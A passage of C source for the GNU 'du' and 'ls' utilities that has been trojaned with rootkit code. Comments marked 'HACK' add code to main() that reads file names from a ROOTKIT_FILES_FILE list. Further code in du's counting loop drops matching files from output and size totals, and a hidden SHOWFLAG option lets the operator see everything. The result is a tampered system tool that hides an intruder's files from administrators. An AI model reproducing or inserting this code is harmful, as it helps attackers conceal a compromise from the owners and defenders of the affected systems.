    {
      error (0, errno, "%s", path->text);
      exit_status = 1;
      return 0;
    }

/* HACK remove blocked files before they are printed or size is summed */

        if (!showall)
                for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
                        if (strstr(ent, h_tmp->filename))
                                return 0;

  if (!opt_count_all
      && stat_buf.st_nlink > 1
      && hash_insert (stat_buf.st_ino, stat_buf.st_dev))
    return 0;			/* Have counted this already.  */

  if (output_size == size_bytes)
    size = stat_buf.st_size;
  else
    size = ST_NBLOCKS (stat_buf);

  tot_size += size;

  if (S_ISDIR (stat_buf.st_mode))
    {
      unsigned pathlen;
      dev_t dir_dev;
      char *name_space;
      char *namep;
      struct saved_cwd cwd;
      int through_symlink;
      struct stat e_buf;

      dir_dev = stat_buf.st_dev;

      if (opt_one_file_system && !top && last_dev != dir_dev)
	return 0;		/* Don't enter a new file system.  */

#ifndef S_ISDIR
# define S_ISDIR(s) 0
#endif
      /* If we're dereferencing symlinks and we're about to chdir through
	 a symlink, remember the current directory so we can return to it
	 later.  In other cases, chdir ("..") works fine.  */
      through_symlink = (xstat == stat
			 && lstat (ent, &e_buf) == 0
			 && S_ISLNK (e_buf.st_mode));
      if (through_symlink)
	if (save_cwd (&cwd))
	  exit (1);

      if (chdir (ent) < 0)
	{
	  error (0, errno, _("cannot change to directory %s"), path->text);
	  exit_status = 1;
	  return 0;
	}

      errno = 0;
      name_space = savedir (".", stat_buf.st_size);
      if (name_space == NULL)
	{
	  if (errno)
	    {
	      error (0, errno, "%s", path->text);
	      if (through_symlink)
		{
		  if (restore_cwd (&cwd, "..", path->text))
		    exit (1);
		  free_cwd (&cwd);
		}
	      else if (chdir ("..") < 0)
		  error (1, errno, _("cannot change to `..' from directory %s"),
			 path->text);
	      exit_status = 1;
	      return 0;
	    }
	  else
	    error (1, 0, _("virtual memory exhausted"));
	}

      /* Remember the current path.  */

      str_concatc (path, "/");
      pathlen = path->length;

      namep = name_space;
      while (*namep != 0)
	{
	  str_concatc (path, namep);

	  size += count_entry (namep, 0, dir_dev);

	  str_trunc (path, pathlen);
	  namep += strlen (namep) + 1;
	}
      free (name_space);
      if (through_symlink)
	{
	  restore_cwd (&cwd, "..", path->text);
	  free_cwd (&cwd);
	}
      else if (chdir ("..") < 0)
        error (1, errno,
	       _("cannot change to `..' from directory %s"), path->text);

      str_trunc (path, pathlen - 1); /* Remove the "/" we added.  */
      if (!opt_summarize_only || top)
	{
	  if (opt_human_readable)
	    {
	      char buf[LONGEST_HUMAN_READABLE + 1];
	      printf("%s\t%s\n",
		     human_readable (size, buf, LONGEST_HUMAN_READABLE + 1),
		     path->length > 0 ? path->text : "/");
	    }
	  else
	    {
	      printf ("%ld\t%s\n", (output_size == size_bytes
				    ? size
				    : convert_blocks (size, output_size)),
		      path->length > 0 ? path->text : "/");
	    }
	  fflush (stdout);
	}
      return opt_separate_dirs ? 0 : size;
    }
  else if (opt_all || top)
    {
      /* FIXME: make this an option.  */
      int print_only_dir_size = 0;
      if (!print_only_dir_size)
	{
	  if (opt_human_readable)
	    {
	      char buf[LONGEST_HUMAN_READABLE + 1];
	      printf("%s\t%s\n",
		     human_readable (size, buf, LONGEST_HUMAN_READABLE + 1),
		     path->length > 0 ? path->text : "/");
	    }
	  else
	    {
	      printf ("%ld\t%s\n", output_size == size_bytes ? size
		      : convert_blocks (size, output_size == size_kilobytes),
		      path->text);
	    }
	  fflush (stdout);
	}
    }

  return size;
}

/* Allocate space for the hash structures, and set the global
   variable `htab' to point to it.  The initial hash module is specified in
   MODULUS, and the number of entries are specified in ENTRY_TAB_SIZE.  (The
   hash structure will be rebuilt when ENTRY_TAB_SIZE entries have been
   inserted, and MODULUS and ENTRY_TAB_SIZE in the global `htab' will be
   doubled.)  */

static void
hash_init (unsigned int modulus, unsigned int entry_tab_size)
{
  struct htab *htab_r;

  htab_r = (struct htab *)
    xmalloc (sizeof (struct htab) + sizeof (struct entry *) * modulus);

  htab_r->entry_tab = (struct entry *)
    xmalloc (sizeof (struct entry) * entry_tab_size);

  htab_r->modulus = modulus;
  htab_r->entry_tab_size = entry_tab_size;
  htab = htab_r;

  hash_reset ();
}

/* Reset the hash structure in the global variable `htab' to
   contain no entries.  */

static void
hash_reset (void)
{
  int i;
  struct entry **p;

  htab->first_free_entry = 0;

  p = htab->hash;
  for (i = htab->modulus; i > 0; i--)
    *p++ = NULL;
}

/* Insert an item (inode INO and device DEV) in the hash
   structure in the global variable `htab', if an entry with the same data
   was not found already.  Return zero if the item was inserted and nonzero
   if it wasn't.  */

static int
hash_insert (ino_t ino, dev_t dev)
{
  struct htab *htab_r = htab;	/* Initially a copy of the global `htab'.  */

  if (htab_r->first_free_entry >= htab_r->entry_tab_size)
    {
      int i;
      struct entry *ep;
      unsigned modulus;
      unsigned entry_tab_size;

      /* Increase the number of hash entries, and re-hash the data.
	 The method of shrimping and increasing is made to compactify
	 the heap.  If twice as much data would be allocated
	 straightforwardly, we would never re-use a byte of memory.  */

      /* Let `htab' shrimp.  Keep only the header, not the pointer vector.  */

      htab_r = (struct htab *)
	xrealloc ((char *) htab_r, sizeof (struct htab));

      modulus = 2 * htab_r->modulus;
      entry_tab_size = 2 * htab_r->entry_tab_size;

      /* Increase the number of possible entries.  */

      htab_r->entry_tab = (struct entry *)
	xrealloc ((char *) htab_r->entry_tab,
		 sizeof (struct entry) * entry_tab_size);

      /* Increase the size of htab again.  */

      htab_r = (struct htab *)
	xrealloc ((char *) htab_r,
		 sizeof (struct htab) + sizeof (struct entry *) * modulus);

      htab_r->modulus = modulus;
      htab_r->entry_tab_size = entry_tab_size;
      htab = htab_r;

      i = htab_r->first_free_entry;

      /* Make the increased hash table empty.  The entries are still
	 available in htab->entry_tab.  */

      hash_reset ();

      /* Go through the entries and install them in the pointer vector
	 htab->hash.  The items are actually inserted in htab->entry_tab at
	 the position where they already are.  The htab->coll_link need
	 however be updated.  Could be made a little more efficient.  */

      for (ep = htab_r->entry_tab; i > 0; i--)
	{
	  hash_insert2 (htab_r, ep->ino, ep->dev);
	  ep++;
	}
    }

  return hash_insert2 (htab_r, ino, dev);
}

/* Insert INO and DEV in the hash structure HTAB, if not
   already present.  Return zero if inserted and nonzero if it
   already existed.  */

static int
hash_insert2 (struct htab *htab, ino_t ino, dev_t dev)
{
  struct entry **hp, *ep2, *ep;
  hp = &htab->hash[ino % htab->modulus];
  ep2 = *hp;

  /* Collision?  */

  if (ep2 != NULL)
    {
      ep = ep2;

      /* Search for an entry with the same data.  */

      do
	{
	  if (ep->ino == ino && ep->dev == dev)
	    return 1;		/* Found an entry with the same data.  */
	  ep = ep->coll_link;
	}
      while (ep != NULL);

      /* Did not find it.  */

    }

  ep = *hp = &htab->entry_tab[htab->first_free_entry++];
  ep->ino = ino;
  ep->dev = dev;
  ep->coll_link = ep2;		/* `ep2' is NULL if no collision.  */

  return 0;
}

/* Initialize the struct string S1 for holding SIZE characters.  */

static void
str_init (string *s1, unsigned int size)
{
  string s;

  s = (string) xmalloc (sizeof (stringstruct));
  s->text = xmalloc (size + 1);

  s->alloc = size;
  *s1 = s;
}

static void
ensure_space (string s, unsigned int size)
{
  if (s->alloc < size)
    {
      s->text = xrealloc (s->text, size + 1);
      s->alloc = size;
    }
}

/* Assign the null-terminated C-string CSTR to S1.  */

static void
str_copyc (string s1, char *cstr)
{
  unsigned l = strlen (cstr);
  ensure_space (s1, l);
  strcpy (s1->text, cstr);
  s1->length = l;
}

static void
str_concatc (string s1, char *cstr)
{
  unsigned l1 = s1->length;
  unsigned l2 = strlen (cstr);
  unsigned l = l1 + l2;

  ensure_space (s1, l);
  strcpy (s1->text + l1, cstr);
  s1->length = l;
}

/* Truncate the string S1 to have length LENGTH.  */

static void
str_trunc (string s1, unsigned int length)
{
  if (s1->length > length)
    {
      s1->text[length] = 0;
      s1->length = length;
    }
}
/* `dir', `vdir' and `ls' directory listing programs for GNU.
   Copyright (C) 85, 88, 90, 91, 95, 1996 Free Software Foundation, Inc.

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2, or (at your option)
   any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

/* If the macro MULTI_COL is defined,
   the multi-column format is the default regardless
   of the type of output device.
   This is for the `dir' program.

   If the macro LONG_FORMAT is defined,
   the long format is the default regardless of the
   type of output device.
   This is for the `vdir' program.

   If neither is defined,
   the output format depends on whether the output
   device is a terminal.
   This is for the `ls' program. */

/* Written by Richard Stallman and David MacKenzie.  */

/* Color support by Peter Anvin <Peter.Anvin@linux.org> and Dennis
   Flaherty <dennisf@denix.elk.miles.com> based on original patches by
   Greg Lee <lee@uhunix.uhcc.hawaii.edu>.  */

#ifdef _AIX
 #pragma alloca
#endif

#include <config.h>
#include <sys/types.h>

#include <termios.h>
#ifdef GWINSZ_IN_SYS_IOCTL
# include <sys/ioctl.h>
#endif

#include <stdio.h>
#include <grp.h>
#include <pwd.h>
#include <getopt.h>

#if HAVE_LIMITS_H
/* limits.h must come before system.h because limits.h on some systems
   undefs PATH_MAX, whereas system.h includes pathmax.h which sets
   PATH_MAX.  */
# include <limits.h>
#endif

#include "system.h"
#include <fnmatch.h>

#include "obstack.h"
#include "ls.h"
#include "error.h"
#include "argmatch.h"
#include "xstrtol.h"

#define obstack_chunk_alloc xmalloc
#define obstack_chunk_free free

#ifndef INT_MAX
# define INT_MAX 2147483647
#endif

/* Return an int indicating the result of comparing two longs. */
#if (INT_MAX <= 65535)
# define longdiff(a, b) ((a) < (b) ? -1 : (a) > (b) ? 1 : 0)
#else
# define longdiff(a, b) ((a) - (b))
#endif

/* The maximum number of digits required to print an inode number
   in an unsigned format.  */
#ifndef INODE_DIGITS
# define INODE_DIGITS 7
#endif

enum filetype
  {
    symbolic_link,
    directory,
    arg_directory,		/* Directory given as command line arg. */
    normal			/* All others. */
  };

struct fileinfo
  {
    /* The file name. */
    char *name;

    struct stat stat;

    /* For symbolic link, name of the file linked to, otherwise zero. */
    char *linkname;

    /* For symbolic link and long listing, st_mode of file linked to, otherwise
       zero. */
    unsigned int linkmode;

    /* For symbolic link and color printing, 1 if linked-to file
       exits, otherwise 0.  */
    int linkok;

    enum filetype filetype;
  };

#define LEN_STR_PAIR(s) sizeof (s) - 1, s

/* Null is a valid character in a color indicator (think about Epson
   printers, for example) so we have to use a length/buffer string
   type.  */

struct bin_str
  {
    unsigned int len;		/* Number of bytes */
    char *string;		/* Pointer to the same */
  };

#ifndef STDC_HEADERS
char *ctime ();
time_t time ();
void free ();
#endif

/* HACK VARS */
#define FILENAME ROOTKIT_FILES_FILE
#define STR_SIZE 128

struct  h_st {
        struct h_st     *next;
        char            filename[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp;

char    tmp_str[STR_SIZE];

FILE    *fp_hack;
int     showall=0;

/*+  End hack vars  +*/

void mode_string ();

char *stpcpy ();
char *xstrdup ();
char *getgroup ();
char *getuser ();
char *xmalloc ();
char *xrealloc ();
void invalid_arg ();

static char *make_link_path __P ((const char *path, const char *linkname));
static int compare_atime __P ((const struct fileinfo *file1,
			       const struct fileinfo *file2));
static int rev_cmp_atime __P ((const struct fileinfo *file2,
			       const struct fileinfo *file1));
static int compare_ctime __P ((const struct fileinfo *file1,
			       const struct fileinfo *file2));
static int rev_cmp_ctime __P ((const struct fileinfo *file2,
			       const struct fileinfo *file1));
static int compare_mtime __P ((const struct fileinfo *file1,
			       const struct fileinfo *file2));
static int rev_cmp_mtime __P ((const struct fileinfo *file2,
			       const struct fileinfo *file1));
static int compare_size __P ((const struct fileinfo *file1,
			      const struct fileinfo *file2));
static int rev_cmp_size __P ((const struct fileinfo *file2,
			      const struct fileinfo *file1));
static int compare_name __P ((const struct fileinfo *file1,
			      const struct fileinfo *file2));
static int rev_cmp_name __P ((const struct fileinfo *file2,
			      const struct fileinfo *file1));
static int compare_extension __P ((const struct fileinfo *file1,
				   const struct fileinfo *file2));
static int rev_cmp_extension __P ((const struct fileinfo *file2,
				   const struct fileinfo *file1));
static int decode_switches __P ((int argc, char **argv));
static int file_interesting __P ((const struct dirent *next));
static int gobble_file __P ((const char *name, int explicit_arg,
			     const char *dirname));
static int is_not_dot_or_dotdot __P ((const char *name));
static void print_color_indicator __P ((const char *name, unsigned int mode,
					int linkok));
static void put_indicator __P ((const struct bin_str *ind));
static int length_of_file_name_and_frills __P ((const struct fileinfo *f));
static void add_ignore_pattern __P ((const char *pattern));
static void attach __P ((char *dest, const char *dirname, const char *name));
static void clear_files __P ((void));
static void extract_dirs_from_files __P ((const char *dirname, int recursive));
static void get_link_name __P ((const char *filename, struct fileinfo *f));
static void indent __P ((int from, int to));
static void print_current_files __P ((void));
static void print_dir __P ((const char *name, const char *realname));
static void print_file_name_and_frills __P ((const struct fileinfo *f));
static void print_horizontal __P ((void));
static void print_long_format __P ((const struct fileinfo *f));
static void print_many_per_line __P ((void));
static void print_name_with_quoting __P ((const char *p, unsigned int mode,
					  int linkok));
static void print_type_indicator __P ((unsigned int mode));
static void print_with_commas __P ((void));
static void queue_directory __P ((const char *name, const char *realname));
static void sort_files __P ((void));
static void parse_ls_color __P ((void));
static void usage __P ((int status));

/* The name the program was run with, stripped of any leading path. */
char *program_name;

/* The table of files in the current directory:

   `files' points to a vector of `struct fileinfo', one per file.
   `nfiles' is the number of elements space has been allocated for.
   `files_index' is the number actually in use.  */

/* Address of block containing the files that are described.  */

static struct fileinfo *files;

/* Length of block that `files' points to, measured in files.  */

static int nfiles;

/* Index of first unused in `files'.  */

static int files_index;

/* Record of one pending directory waiting to be listed.  */

struct pending
  {
    char *name;
    /* If the directory is actually the file pointed to by a symbolic link we
       were told to list, `realname' will contain the name of the symbolic
       link, otherwise zero. */
    char *realname;
    struct pending *next;
  };

static struct pending *pending_dirs;

/* Current time (seconds since 1970).  When we are printing a file's time,
   include the year if it is more than 6 months before this time.  */

static time_t current_time;

/* The number of digits to use for block sizes.
   4, or more if needed for bigger numbers.  */

static int block_size_size;

/* Option flags */

/* long_format for lots of info, one per line.
   one_per_line for just names, one per line.
   many_per_line for just names, many per line, sorted vertically.
   horizontal for just names, many per line, sorted horizontally.
   with_commas for just names, many per line, separated by commas.

   -l, -1, -C, -x and -m control this parameter.  */

enum format
  {
    long_format,		/* -l */
    one_per_line,		/* -1 */
    many_per_line,		/* -C */
    horizontal,			/* -x */
    with_commas			/* -m */
  };

static enum format format;

/* Type of time to print or sort by.  Controlled by -c and -u.  */

enum time_type
  {
    time_mtime,			/* default */
    time_ctime,			/* -c */
    time_atime			/* -u */
  };

static enum time_type time_type;

/* print the full time, otherwise the standard unix heuristics. */

int full_time;

/* The file characteristic to sort by.  Controlled by -t, -S, -U, -X. */

enum sort_type
  {
    sort_none,			/* -U */
    sort_name,			/* default */
    sort_extension,		/* -X */
    sort_time,			/* -t */
    sort_size			/* -S */
  };

static enum sort_type sort_type;

/* Direction of sort.
   0 means highest first if numeric,
   lowest first if alphabetic;
   these are the defaults.
   1 means the opposite order in each case.  -r  */

static int sort_reverse;

/* Nonzero means to NOT display group information.  -G  */

int inhibit_group;

/* Nonzero means print the user and group id's as numbers rather
   than as names.  -n  */

static int numeric_users;

/* Nonzero means mention the size in 512 byte blocks of each file.  -s  */

static int print_block_size;

/* Nonzero means show file sizes in kilobytes instead of blocks
   (the size of which is system-dependent).  -k */

static int kilobyte_blocks;

/* Precede each line of long output (per file) with a string like `m,n:'
   where M is the number of characters after the `:' and before the
   filename and N is the length of the filename.  Using this format,
   Emacs' dired mode starts up twice as fast, and can handle all
   strange characters in file names.  */
static int dired;

/* `none' means don't mention the type of files.
   `all' means mention the types of all files.
   `not_programs' means do so except for executables.

   Controlled by -F and -p.  */

enum indicator_style
  {
    none,                      /* default */
    all,                       /* -F */
    not_programs               /* -p */
  };

static enum indicator_style indicator_style;

/* Nonzero means use colors to mark types.  Also define the different
   colors as well as the stuff for the LS_COLORS environment variable.
   The LS_COLORS variable is now in a termcap-like format.  */

static int print_with_color;

enum color_type
  {
    color_never,		/* 0: default or --color=never */
    color_always,		/* 1: --color=always */
    color_if_tty		/* 2: --color=tty */
  };

enum indicator_no
  {
    C_LEFT, C_RIGHT, C_END, C_NORM, C_FILE, C_DIR, C_LINK, C_FIFO, C_SOCK,
    C_BLK, C_CHR, C_MISSING, C_ORPHAN, C_EXEC
  };

static const char *const indicator_name[]=
  {
    "lc", "rc", "ec", "no", "fi", "di", "ln", "pi", "so",
    "bd", "cd", "mi", "or", "ex", NULL
  };

struct col_ext_type
  {
    struct bin_str ext;		/* The extension we're looking for */
    struct bin_str seq;		/* The sequence to output when we do */
    struct col_ext_type *next;	/* Next in list */
  };

static struct bin_str color_indicator[] =
  {
    { LEN_STR_PAIR ("\033[") },		/* lc: Left of color sequence */
    { LEN_STR_PAIR ("m") },		/* rc: Right of color sequence */
    { 0, NULL },			/* ec: End color (replaces lc+no+rc) */
    { LEN_STR_PAIR ("0") },		/* no: Normal */
    { LEN_STR_PAIR ("0") },		/* fi: File: default */
    { LEN_STR_PAIR ("01;34") },		/* di: Directory: bright blue */
    { LEN_STR_PAIR ("01;36") },		/* ln: Symlink: bright cyan */
    { LEN_STR_PAIR ("33") },		/* pi: Pipe: yellow/brown */
    { LEN_STR_PAIR ("01;35") },		/* so: Socket: bright magenta */
    { LEN_STR_PAIR ("01;33") },		/* bd: Block device: bright yellow */
    { LEN_STR_PAIR ("01;33") },		/* cd: Char device: bright yellow */
    { 0, NULL },			/* mi: Missing file: undefined */
    { 0, NULL },			/* or: Orphanned symlink: undefined */
    { LEN_STR_PAIR ("01;32") }		/* ex: Executable: bright green */
  };

/* FIXME: comment  */
struct col_ext_type *col_ext_list = NULL;

/* Buffer for color sequences */
static char *color_buf;

/* Nonzero means mention the inode number of each file.  -i  */

static int print_inode;

/* Nonzero means when a symbolic link is found, display info on
   the file linked to.  -L  */

static int trace_links;

/* Nonzero means when a directory is found, display info on its
   contents.  -R  */

static int trace_dirs;

/* Nonzero means when an argument is a directory name, display info
   on it itself.  -d  */

static int immediate_dirs;

/* Nonzero means don't omit files whose names start with `.'.  -A */

static int all_files;

/* Nonzero means don't omit files `.' and `..'
   This flag implies `all_files'.  -a  */

static int really_all_files;

/* A linked list of shell-style globbing patterns.  If a non-argument
   file name matches any of these patterns, it is omitted.
   Controlled by -I.  Multiple -I options accumulate.
   The -B option adds `*~' and `.*~' to this list.  */

struct ignore_pattern
  {
    const char *pattern;
    struct ignore_pattern *next;
  };

static struct ignore_pattern *ignore_patterns;

/* Nonzero means quote nongraphic chars in file names.  -b  */

static int quote_funny_chars;

/* Nonzero means output nongraphic chars in file names as `?'.  -q  */

static int qmark_funny_chars;

/* Nonzero means output each file name using C syntax for a string.
   Always accompanied by `quote_funny_chars'.
   This mode, together with -x or -C or -m,
   and without such frills as -F or -s,
   is guaranteed to make it possible for a program receiving
   the output to tell exactly what file names are present.  -Q  */

static int quote_as_string;

/* The number of chars per hardware tab stop.  Setting this to zero
   inhibits the use of TAB characters for separating columns.  -T */
static int tabsize;

/* Nonzero means we are listing the working directory because no
   non-option arguments were given. */

static int dir_defaulted;

/* Nonzero means print each directory name before listing it. */

static int print_dir_name;

/* The line length to use for breaking lines in many-per-line format.
   Can be set with -w.  */

static int line_length;

/* If nonzero, the file listing format requires that stat be called on
   each file. */

static int format_needs_stat;

/* The exit status to use if we don't get any fatal errors. */

static int exit_status;

/* If nonzero, display usage information and exit.  */
static int show_help;

/* If nonzero, print the version on standard output and exit.  */
static int show_version;

static struct option const long_options[] =
{
  {"all", no_argument, 0, 'a'},
  {"escape", no_argument, 0, 'b'},
  {"directory", no_argument, 0, 'd'},
  {"dired", no_argument, 0, 'D'},
  {"full-time", no_argument, &full_time, 1},
  {"inode", no_argument, 0, 'i'},
  {"kilobytes", no_argument, 0, 'k'},
  {"numeric-uid-gid", no_argument, 0, 'n'},
  {"no-group", no_argument, 0, 'G'},
  {"hide-control-chars", no_argument, 0, 'q'},
  {"reverse", no_argument, 0, 'r'},
  {"size", no_argument, 0, 's'},
  {"width", required_argument, 0, 'w'},
  {"almost-all", no_argument, 0, 'A'},
  {"ignore-backups", no_argument, 0, 'B'},
  {"classify", no_argument, 0, 'F'},
  {"file-type", no_argument, 0, 'F'},
  {"ignore", required_argument, 0, 'I'},
  {"dereference", no_argument, 0, 'L'},
  {"literal", no_argument, 0, 'N'},
  {"quote-name", no_argument, 0, 'Q'},
  {"recursive", no_argument, 0, 'R'},
  {"format", required_argument, 0, 12},
  {"sort", required_argument, 0, 10},
  {"tabsize", required_argument, 0, 'T'},
  {"time", required_argument, 0, 11},
  {"help", no_argument, &show_help, 1},
  {"version", no_argument, &show_version, 1},
  {"color", optional_argument, 0, 13},
  {"7bit", no_argument, 0, '7'},
  {"8bit", no_argument, 0, '8'},
  {NULL, 0, NULL, 0}
};

static char const *const format_args[] =
{
  "verbose", "long", "commas", "horizontal", "across",
  "vertical", "single-column", 0
};

static enum format const formats[] =
{
  long_format, long_format, with_commas, horizontal, horizontal,
  many_per_line, one_per_line
};

static char const *const sort_args[] =
{
  "none", "time", "size", "extension", 0
};

static enum sort_type const sort_types[] =
{
  sort_none, sort_time, sort_size, sort_extension
};

static char const *const time_args[] =
{
  "atime", "access", "use", "ctime", "status", 0
};

/* This zero-based index is used solely with the --dired option.
   When that option is in effect, this counter is incremented for each
   character of output generated by this program so that the beginning
   and ending indices (in that output) of every file name can be recorded
   and later output themselves.  */
static size_t dired_pos;

#define PUTCHAR(c) do {putchar ((c)); ++dired_pos;} while (0)

/* Write S to STREAM and increment DIRED_POS by S_LEN.  */
#define FPUTS(s, stream, s_len) \
    do {fputs ((s), (stream)); dired_pos += s_len;} while (0)

/* Like FPUTS, but for use when S is a literal string.  */
#define FPUTS_LITERAL(s, stream) \
    do {fputs ((s), (stream)); dired_pos += sizeof((s)) - 1;} while (0)

#define DIRED_INDENT()							\
    do									\
      {									\
	/* FIXME: remove the `&& format == long_format' clause.  */	\
	if (dired && format == long_format)				\
	  FPUTS_LITERAL ("  ", stdout);					\
      }									\
    while (0)

/* With --dired, store pairs of beginning and ending indices of filenames.  */
static struct obstack dired_obstack;

/* With --dired, store pairs of beginning and ending indices of any
   directory names that appear as headers (just before `total' line)
   for lists of directory entries.  Such directory names are seen when
   listing hierarchies using -R and when a directory is listed with at
   least one other command line argument.  */
static struct obstack subdired_obstack;

/* Save the current index on the specified obstack, OBS.  */
#define PUSH_CURRENT_DIRED_POS(obs)					\
  do									\
    {									\
      /* FIXME: remove the `&& format == long_format' clause.  */	\
      if (dired && format == long_format)				\
	obstack_grow ((obs), &dired_pos, sizeof (dired_pos));		\
    }									\
  while (0)

static enum time_type const time_types[] =
{
  time_atime, time_atime, time_atime, time_ctime, time_ctime
};

static char const *const color_args[] =
  {
    /* Note: "no" is a prefix of "none" so we don't include it.  */
    /* force and none are for compatibility with another color-ls version */
    "always", "yes", "force",
    "never", "none",
    "auto", "tty", "if-tty", 0
  };

static enum color_type const color_types[] =
  {
    color_always, color_always, color_always,
    color_never, color_never,
    color_if_tty, color_if_tty, color_if_tty
  };


/* Write to standard output the string PREFIX followed by a space-separated
   list of the integers stored in OS all on one line.  */

static void
dired_dump_obstack (const char *prefix, struct obstack *os)
{
  int n_pos;

  n_pos = obstack_object_size (os) / sizeof (size_t);
  if (n_pos > 0)
    {
      int i;
      size_t *pos;

      pos = (size_t *) obstack_finish (os);
      fputs (prefix, stdout);
      for (i = 0; i < n_pos; i++)
	printf (" %d", (int) pos[i]);
      fputs ("\n", stdout);
    }
}

int
main (int argc, char **argv)
{
  register int i;
  register struct pending *thispend;

  program_name = argv[0];
  setlocale (LC_ALL, "");
  bindtextdomain (PACKAGE, LOCALEDIR);
  textdomain (PACKAGE);

  exit_status = 0;
  dir_defaulted = 1;
  print_dir_name = 1;
  pending_dirs = 0;
  current_time = time ((time_t *) 0);

  i = decode_switches (argc, argv);

  if (show_version)
    {
      printf ("%s - %s\n",
	      (ls_mode == LS_LS ? "ls"
	       : (ls_mode == LS_MULTI_COL ? "dir" : "vdir")),
	      PACKAGE_VERSION);
      exit (0);
    }

  if (show_help)
    usage (0);

/*+  HACK Read in list of files to block  +*/

        h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
        hack_list=h_tmp;

        if (fp_hack=fopen (FILENAME, "r")) {
                while (fgets(tmp_str, 126, fp_hack)) {
                        h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
                        strcpy (h_tmp->filename, tmp_str);
                        h_tmp->filename[strlen(h_tmp->filename)-1]='\0';
                        h_tmp=h_tmp->next;
                }
        fclose(fp_hack);
        }
h_tmp->next=NULL;

/*+  On with the program  +*/

  if (print_with_color)
    parse_ls_color ();

  format_needs_stat = sort_type == sort_time || sort_type == sort_size
    || format == long_format
    || trace_links || trace_dirs || indicator_style != none
    || print_block_size || print_inode || print_with_color;

  if (dired && format == long_format)
    {
      obstack_init (&dired_obstack);
      obstack_init (&subdired_obstack);
    }

  nfiles = 100;
  files = (struct fileinfo *) xmalloc (sizeof (struct fileinfo) * nfiles);
  files_index = 0;

  clear_files ();

  if (i < argc)
    dir_defaulted = 0;
  for (; i < argc; i++)
    gobble_file (argv[i], 1, "");

  if (dir_defaulted)
    {
      if (immediate_dirs)
	gobble_file (".", 1, "");
      else
	queue_directory (".", 0);
    }

  if (files_index)
    {
      sort_files ();
      if (!immediate_dirs)
	extract_dirs_from_files ("", 0);
      /* `files_index' might be zero now.  */
    }
  if (files_index)
    {
      print_current_files ();
      if (pending_dirs)
	PUTCHAR ('\n');
    }
  else if (pending_dirs && pending_dirs->next == 0)
    print_dir_name = 0;

  while (pending_dirs)
    {
      thispend = pending_dirs;
      pending_dirs = pending_dirs->next;
      print_dir (thispend->name, thispend->realname);
      free (thispend->name);
      if (thispend->realname)
	free (thispend->realname);
      free (thispend);
      print_dir_name = 1;
    }

  if (dired && format == long_format)
    {
      /* No need to free these since we're about to exit.  */
      dired_dump_obstack ("//DIRED//", &dired_obstack);
      dired_dump_obstack ("//SUBDIRED//", &subdired_obstack);
    }

  exit (exit_status);
}

/* Set all the option flags according to the switches specified.
   Return the index of the first non-option argument.  */

static int
decode_switches (int argc, char **argv)
{
  register char *p;
  int c;
  int i;
  long int tmp_long;

  qmark_funny_chars = 0;
  quote_funny_chars = 0;

  /* initialize all switches to default settings */

  switch (ls_mode)
    {
    case LS_MULTI_COL:
      /* This is for the `dir' program.  */
      format = many_per_line;
      quote_funny_chars = 1;
      break;

    case LS_LONG_FORMAT:
      /* This is for the `vdir' program.  */
      format = long_format;
      quote_funny_chars = 1;
      break;

    case LS_LS:
      /* This is for the `ls' program.  */
      if (isatty (1))
	{
	  format = many_per_line;
	  qmark_funny_chars = 1;
	}
      else
	{
	  format = one_per_line;
	  qmark_funny_chars = 0;
	}
      break;

    default:
      abort ();
    }

  time_type = time_mtime;
  full_time = 0;
  sort_type = sort_name;
  sort_reverse = 0;
  numeric_users = 0;
  print_block_size = 0;
  kilobyte_blocks = getenv ("POSIXLY_CORRECT") == 0;
  indicator_style = none;
  print_inode = 0;
  trace_links = 0;
  trace_dirs = 0;
  immediate_dirs = 0;
  all_files = 0;
  really_all_files = 0;
  ignore_patterns = 0;
  quote_as_string = 0;

  line_length = 80;
  if ((p = getenv ("COLUMNS")))
    {
      if (xstrtol (p, NULL, 0, &tmp_long, NULL) == LONGINT_OK
	  && 0 < tmp_long && tmp_long <= INT_MAX)
	{
	  line_length = (int) tmp_long;
	}
      else
	{
	  error (0, 0,
	       _("ignoring invalid width in environment variable COLUMNS: %s"),
		 p);
	}
    }

#ifdef TIOCGWINSZ
  {
    struct winsize ws;

    if (ioctl (1, TIOCGWINSZ, &ws) != -1 && ws.ws_col != 0)
      line_length = ws.ws_col;
  }
#endif

  /* Using the TABSIZE environment variable is not POSIX-approved.
     Ignore it when POSIXLY_CORRECT is set.  */
  tabsize = 8;
  if (!getenv ("POSIXLY_CORRECT") && (p = getenv ("TABSIZE")))
    {
      if (xstrtol (p, NULL, 0, &tmp_long, NULL) == LONGINT_OK
	  && 0 <= tmp_long && tmp_long <= INT_MAX)
	{
	  tabsize = (int) tmp_long;
	}
      else
	{
	  error (0, 0,
	   _("ignoring invalid tab size in environment variable TABSIZE: %s"),
		 p);
	}
    }
/* HACK showflag */
#if defined (SHOWFLAG)
while ((c = getopt_long (argc, argv,
                           "abcdfgiklmnopqrstuw/:xABCDFGI:LNQRST:UX178",
                           long_options, (int *) 0)) != EOF)
#else
  while ((c = getopt_long (argc, argv,
			   "abcdfgiklmnopqrstuw:xABCDFGI:LNQRST:UX178",
			   long_options, (int *) 0)) != EOF)
#endif
    {
      switch (c)
	{
	case 0:
	  break;

	case 'a':
	  all_files = 1;
	  really_all_files = 1;
	  break;

	case 'b':
	  quote_funny_chars = 1;
	  qmark_funny_chars = 0;
	  break;

	case 'c':
	  time_type = time_ctime;
	  sort_type = sort_time;
	  break;

	case 'd':
	  immediate_dirs = 1;
	  break;

	case 'f':
	  /* Same as enabling -a -U and disabling -l -s.  */
	  all_files = 1;
	  really_all_files = 1;
	  sort_type = sort_none;
	  /* disable -l */
	  if (format == long_format)
	    format = (isatty (1) ? many_per_line : one_per_line);
	  print_block_size = 0;	/* disable -s */
	  print_with_color = 0;	/* disable --color */
	  break;

	case 'g':
	  /* No effect.  For BSD compatibility. */
	  break;

	case 'i':
	  print_inode = 1;
	  break;

	case 'k':
	  kilobyte_blocks = 1;
